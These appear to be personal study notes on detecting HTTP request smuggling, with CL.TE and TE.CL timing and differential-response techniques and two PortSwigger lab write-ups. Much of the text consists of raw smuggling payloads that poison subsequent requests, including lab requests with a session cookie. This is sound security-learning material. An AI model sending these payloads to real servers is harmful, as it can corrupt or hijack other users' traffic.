---
sticker: emoji//2705
---


### Detection techniques
Generally, the best technique is to send **requests that will cause a time delay** in the application's **responses** if a vulnerability is present. *(Performed by Burp Scanner when `HTTP Request Smuggler` extension is on)*
#### Detection via Timing techniques

##### Type: `CL.TE` - use FIRST
**Frontend:** `Content-Length` (only forwards `1A`, omits `X`)
**Backend:** `Transfer-Encoding` (processes first chunk, **hangs waiting for trailing `0` to arrive**)
``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

##### Type: `TE.CL` - use SECOND, as can be disruptive to other users
**Frontend:** `Transfer-Encoding` (only forwards part of request - empty line - omits `X`)
**Backend:** `Content-Length` (expects the full message including `X` due to `Content-Length: 6`:, so **hangs waiting for omitted `X` to arrive**)
``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

### Confirming via differential responses
After it's been confirmed on a timing basis, try and **elicit differences** in the **context of the application responses**. Involves sending two requests **in quick succession** (use **[TurboIntruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)**):
- **Attacker** request *(designed to interfere with subsequent request)*
- **Normal** request *(to same endpoint)* --> if this **contains expected interference** (e.g. unexpected/mangled content), vuln. confirmed!

#### `CL.TE` via differential responses
**Attacker Request:**
``` http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```
- **If successful:** Last two lines treated by backend server as **the next request**, as it stops reading after `e` (`5`) bytes.

**Interfered Normal Request:**
``` http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```


#### `TE.CL` via differential responses
==SEE [TL.CE Considerations](Identifying%20&%20Detecting%20HTTP%20Request%20Smuggling.md#TL.CE%20Considerations) BELOW< & use TurboIntruder!== 
- Update Content-Length automatically -> `OFF`
- Include trailing sequence `\r\n\r\n` following the final `0`.
For this, you'd combine **two full requests** like so:
**Attacker Request:**
``` http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```
- **If successful:** Second request (`GET /404`) onwards is treated by the backend **as the next request** as it stops reading after `7c` (`Content-Length: 4`).

**Interfered Normal Request:**
``` http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
- Backend appends the previous smuggled `GET /404` request to the normal one, producing an invalid URL and a 404.

##### TL.CE Considerations:
- "Attacker" and "Normal" requests should be sent using **different network connections** to prove the vulnerability.
- To **maximise the chance of requests being processed by the SAME backend server**, requests should:
	- **Use the same URL and parameter names** where possible
	- Send the requests **in quick succession** - USING TURBOINTRUDER, see below. You're racing any other requests the application is receiving at the same time, so may need to attempt multiple times.
##### TurboIntruder for `TL.CE`:
*For all TE.CL vulnerabilities, **USE HTTP REQUEST SMUGGLER'S TURBO INTRUDER***. To do so:
- Build your attacker request in Repeater (like we have above)
- Right click, and choose `Extensions` - `HTTP Request Smuggler` - `TE.CL smuggling attack`.
  ![](attachments/Pasted%20image%2020260615163113.png)
   This will **open a Turbo Intruder window to send requests repeatedly**, at a **fast enough speed**, to attempt to **reach and poison the same backend server**.
- Edit the code to remove the pre-filled contents of the "prefix" request, as we've built ours manually and are **here just for TurboIntruder's rapid sequential sending speed**:
  ![](attachments/Pasted%20image%2020260615163340.png)
- Then, press Attack, and review the requests to ensure the content being sent is intended. It should now only be sending them in rapid succession (save a few minor tweaks which didn't seem to impede testing).
I could not for the life of me get these to work with either regular Intruder, manual sending, group based sending of requests, etc. - **but this worked.** 
So, TLDR; `TE.CL` combos are finnicky and require precise timing & tools to exploit.


---
###### Lab: [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
**Objective:** *This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.*

Launched HTTP Request smuggler scan on base `/` element, we examine it manually to test for `CL.TE` via timing. We get a timeout, so is likely vulnerable!
![](attachments/Identifying%20&%20Detecting%20HTTP%20Request%20Smuggling.png)

Moving on, let's try and get this 404 page. Create an Attacker and a Victim tab - `Attacker` with our POST request smuggling in a `404` GET after, and `Victim` with a plain `GET /` request. Ensure to: 
- Show non-printable characters -> `ON`
- Use `HTTP/1.1`
- Send a sanity check `POST` to base endpoint `/`, to check it supports `POST` without a body
![](attachments/Pasted%20image%2020260614182023.png) ![](attachments/Pasted%20image%2020260614182052.png) 
``` http
POST / HTTP/1.1
Host: 0adc00e00489824a8266d5f700da0043.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Now, I like to group these and select `Send group in sequence (separate connection)`, to ensure they arrive in sequence & one after another. Or, can send using Turbo Intruder - whatever allows you to send them quickly, as they need to be **received one after the other** and **sent to the same frontend/backend pair**.
![](attachments/Pasted%20image%2020260614182459.png)
Sending it, the VICTIM tab should show a timeout:
![](attachments/Pasted%20image%2020260614182337.png)
Meaning, the lab is solved, as we've poisoned our victim's subsequent `GET` request with `GET /404` !

---

###### Lab: [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
**Objective:** *This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.
To solve the lab, smuggle a request to the back-end server, so that a subsequent request for `/` (the web root) triggers a 404 Not Found response.*

Launched HTTP Request smuggler scan on base `/` element, we examine it manually to test for TE.CL via timing. We get a timeout, so is likely vulnerable! 
I.e. front end supports transfer encoding, and backend supports content length & hangs waiting for final byte that was dropped by the front-end.
![](attachments/Pasted%20image%2020260614184121.png)
Yesss, now let's try and get this 404 page. 
Create an Attacker and a Victim tab - `Attacker` with our POST request smuggling in a `404` GET after, and `Victim` with a plain `GET /` request. Ensure to:
- Update Content-Length automatically -> `OFF`
- Include trailing sequence `\r\n\r\n` following the final `0`.
- Show non-printable characters -> `ON`
- Use `HTTP/1.1`
- Send a sanity check `POST` to base endpoint `/`, to check it supports `POST` without a body
**Attacker Tab:**
``` http
POST / HTTP/1.1
Host: 0a8f0017037edfd5822d2eb4007d00cc.web-security-academy.net
Cookie: session=AASZtq1GKiXN0JpEGzK6IWJ0OLZWaLiH
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```


So, to smuggle the request:
- Double check HTTP 1.1 & Update Content-Length automatically -> `OFF`
- Send a POST request specifying `Transfer-Encoding: chunked` for front end, and specify the chunk size of the smuggled request by **highlighting the smuggled request from `METHOD` to end of payload, NOT including the final `\r\n`**:
  ![](attachments/Identifying%20&%20Detecting%20HTTP%20Request%20Smuggling-1.png) - so for this, the chunked size is `5c`
- Follow the smuggled request with EXACTLY `0\r\n\r\n`, to tell the front-end that the chunked message block is over.

The `Content-Length` of the MAIN request should be the highlighted selection size of the chunk byte size value (`5c`), so the back end will stop reading the request here.![](attachments/Identifying%20&%20Detecting%20HTTP%20Request%20Smuggling-2.png)

The `Content-Length` of the SMUGGLED request must be the **size of the body of smuggled request `+ 1`**.
This is in order to ensure that at least 1 byte of our normal request/the victim's request, is appended to the **smuggled/poisoned request sent to the backend.**
![](attachments/Identifying%20&%20Detecting%20HTTP%20Request%20Smuggling-3.png)

**Now.** This is the hard bit that I fucked around with for ages to get to work. **The timing.** 

*For all TE.CL vulnerabilities, **USE HTTP REQUEST SMUGGLER'S TURBO INTRUDER***. To do so:
- Build your attacker request in Repeater (like we have above)
- Right click, and choose `Extensions` - `HTTP Request Smuggler` - `TE.CL smuggling attack`.
  ![](attachments/Pasted%20image%2020260615163113.png)
   This will **open a Turbo Intruder window to send requests repeatedly**, at a **fast enough speed**, to attempt to **reach and poison the same backend server**.
- Edit the code to remove the pre-filled contents of the "prefix" request, as we've built ours manually and are **here just for TurboIntruder's rapid sequential sending speed**:
  ![](attachments/Pasted%20image%2020260615163340.png)
- Then, press Attack, and review the requests to ensure the content being sent is intended. It should now only be sending them in rapid succession (save a few minor tweaks which didn't seem to impede testing). And with that, we get our `404`! ![](attachments/Identifying%20&%20Detecting%20HTTP%20Request%20Smuggling-4.png)

I could not for the life of me get it to work with either regular Intruder, manual sending, group based sending of requests, etc. - **but this worked.** 
So, TLDR; `TE.CL` combos are finnicky and require precise timing & tools to exploit.

---

### Detection flowchart:
From: https://youtu.be/4S5fkKJ4SM4
![](attachments/Screenshot%202026-05-14%20at%201.18.03%20am.png)

``` http
POST / HTTP/1.1
Content-Length: 6 
Transfer-Encoding: chunked

3
abc

X

```
- `Content-Length: 6`: indicates to frontend server that if it *is* using CL, request ends after `abc`
- `3`: using `Transfer-Encoding: chunked`, with a chunk of size `3` bytes (`\r\n 3`)
- `X\r\n`: Will **get dropped by front-end server** (as uses `CL` that ends after `6` bytes, aka after `abc`), and then request sent to backend server has **no terminating chunk value of `0` and will thus hang indefinitely.**

![](attachments/Screenshot%202026-05-14%20at%201.23.33%20am.png)

